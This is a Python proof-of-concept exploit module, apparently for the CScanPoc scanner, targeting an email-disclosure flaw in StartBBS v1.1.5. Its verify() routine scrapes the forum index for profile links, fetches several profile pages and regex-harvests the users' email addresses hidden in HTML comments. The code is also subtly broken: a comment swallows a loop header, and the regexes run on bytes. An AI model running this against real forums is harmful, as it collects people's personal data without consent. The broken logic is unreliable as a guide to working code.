# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'StartBBS_0101'  # 平台漏洞编号，留空
    name = 'StartBBS v1.1.5 泄露任意用户邮箱'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-12-10'  # 漏洞公布时间
    desc = '''
        Startbbs - a simple & lightweight Forum. ... Hello, world! StartBBS 是一款优雅、开源、轻量社区系统，基于MVC架构。
        代码 /themes/default/userinfo.php在第86行有这样一句：
        <div class='inner'><p><?php echo $introduction?></p><!--<p>
        联系方式: <a href="mailto:<?php echo $email?>" class="external mail">
        <?php echo $email?></a></p>--></div>

    输出了用户的邮箱，但是给注释掉了，所以用户页面看不到。。查看源代码即可。
    '''  # 漏洞描述
    ref = 'http://www.wooyun.org/bugs/wooyun-2014-051696'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'StartBBS'  # 漏洞应用名称
    product_version = '1.1.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '413f0d18-7cea-4b1d-9323-feb60bfbfa18'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            # GET User
            url = self.target
            index_content = urllib.request.urlopen(url).read()
            regex_user = re.compile(
                r'(/user/info/\\d+)" class="dark startbbs profile_link"', re.IGNORECASE)
            regex_mail = re.compile(
                r"\\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,4}\\b", re.IGNORECASE)
            user_list = regex_user.findall(index_content)
            # Main
            if user_list:
                user_url = []
                user_email = []
                # GET User homepage
                for i in user_list[-3:]:
                    url_tmp = url + i
                    user_url.append(url_tmp)
                # GET Emaifor i in user_url:

                    try:
                        content = urllib.request.urlopen(i).read()
                    except:
                        continue
                    mail_list = regex_mail.findall(content)
                # Success or False
                if mail_list:
                    for mail in mail_list:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                        # user_email.append(mail)
            else:
                return

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
